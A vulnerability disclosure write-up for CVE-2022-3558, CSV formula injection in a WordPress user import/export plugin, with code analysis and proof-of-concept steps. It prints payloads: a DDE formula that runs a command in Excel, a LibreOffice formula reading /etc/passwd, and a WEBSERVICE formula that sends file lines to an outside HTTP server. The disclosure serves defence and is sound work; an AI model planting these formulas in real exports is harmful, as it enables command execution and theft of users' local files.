---
layout: post
categories: vulns
title: "CVE-2022-3558 - Wordpress Plugins - Import and export users and customers - CSV Injection"
permalink: "/:categories/:title/"
---

# Intro

As defined by OWASP : CSV Injection, also known as Formula Injection, occurs when websites embed untrusted input inside CSV files.

When a spreadsheet program such as Microsoft Excel or LibreOffice Calc is used to open a CSV, any cells starting with = will be interpreted by the software as a formula. Maliciously crafted formulas can be used for three key attacks:

* Hijacking the user’s computer by exploiting vulnerabilities in the spreadsheet software, such as CVE-2014-3524.
* Hijacking the user’s computer by exploiting the user’s tendency to ignore security warnings in spreadsheets that they downloaded from their own website.
* Exfiltrating contents from the spreadsheet, or other open spreadsheets.


# Summary

A formula injection (CSV Injection) in the Wordpress plugin **Import and export users and customers version 1.20.4** allows an attacker to inject arbitary excel formulas via manipulation of an unsanitized parameter.


# Code analysis

The **batch_exporter.php** script defines a class named **ACUI_Batch_Exporter** and a property named **user_data** which is an array.

<img src="../../assets/images/posts/vulns/import-export-users/import_users_csv_injection_code_review.png">

The script also defines a method named **get_user_data()** which returns the property **user_data** of the current object.

<img src="../../assets/images/posts/vulns/import-export-users/import_users_csv_injection_code_review_1.png">

The method is called in another method named **load_columns()**.

<img src="../../assets/images/posts/vulns/import-export-users/import_users_csv_injection_code_review_2.png">

The user's data is gathered from the web app's database and is exported to a CSV file format with a delimiter. Wordpress allows users to update their information and specify certain characters such as a comma or a semicolon, that are considered as "delimiters" in a CSV file. 

# Exploit

## Simple formula injection

The following shows the exploitation in form of a simple formula injection in the **Nickname** input which will then be passed to the plugin’s functions and inserted in the final CSV exported file.

<img src="../../assets/images/posts/vulns/import-export-users/import_users_csv_injection_poc.png">

Then, the admin exports the users and downloads the CSV file.

<img src="../../assets/images/posts/vulns/import-export-users/import_users_csv_injection_poc_1.png">

The semicolon has been interpreted as a delimiter, the formula has been read and the result of the arithmetic operation **1+2** is printed in the cell.

<img src="../../assets/images/posts/vulns/import-export-users/import_users_csv_injection_poc_2.png">

## Command Execution

Old versions of Microsoft Excel allow usage of [DDE](https://learn.microsoft.com/en-gb/windows/win32/dataxchg/about-dynamic-data-exchange) (Dynamic Data Exchange) in the default settings. Attackers can abuse this feature to execute commands on the target's system, once the CSV file opened.

This exploit needs the *Enable Dynamic DataExchange Server Launch* option to be enabled on **recent versions of Microsoft Excel**.

```
#Payload 

;=cmd|' /C calc'!xxx

```

<img src="../../assets/images/posts/vulns/import-export-users/import_users_csv_injection_poc_calc_1.png">

In recent versions of Microsoft Excel, a warning message is shown before using the DDE protocol. 

<img src="../../assets/images/posts/vulns/import-export-users/import_users_csv_injection_poc_calc_2.png">

<img src="../../assets/images/posts/vulns/import-export-users/import_users_csv_injection_poc_calc_3.png">

Finally, the attacker gets a command execution on the target's system.

<img src="../../assets/images/posts/vulns/import-export-users/import_users_csv_injection_poc_calc_4.png">



## File read and data exfiltration

Attackers can achieve a local file read and data exfiltration when the malicious CSV file is opened with LibreOffice Calc.

```
# Read line in file

;='file:///etc/passwd'#$passwd.A1

# Exfiltrate line

WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)))

```

<img src="../../assets/images/posts/vulns/import-export-users/import_users_csv_injection_poc_lfi.png">

<img src="../../assets/images/posts/vulns/import-export-users/import_users_csv_injection_poc_lfi_1.png">


# References

* Plugin URL : [https://wordpress.org/plugins/import-users-from-csv-with-meta/](https://wordpress.org/plugins/import-users-from-csv-with-meta/)
* WPScan : [https://wpscan.com/vulnerability/e3d72e04-9cdf-4b7d-953e-876e26abdfc6](https://wpscan.com/vulnerability/e3d72e04-9cdf-4b7d-953e-876e26abdfc6)
* Mitre - CVE-2022-3558 : [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3558](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3558)
* OWASP - CSV Injection : [https://owasp.org/www-community/attacks/CSV_Injection](https://owasp.org/www-community/attacks/CSV_Injection)
* Hacktricks - Formula Injection : [https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#formula-injection](https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#formula-injection)
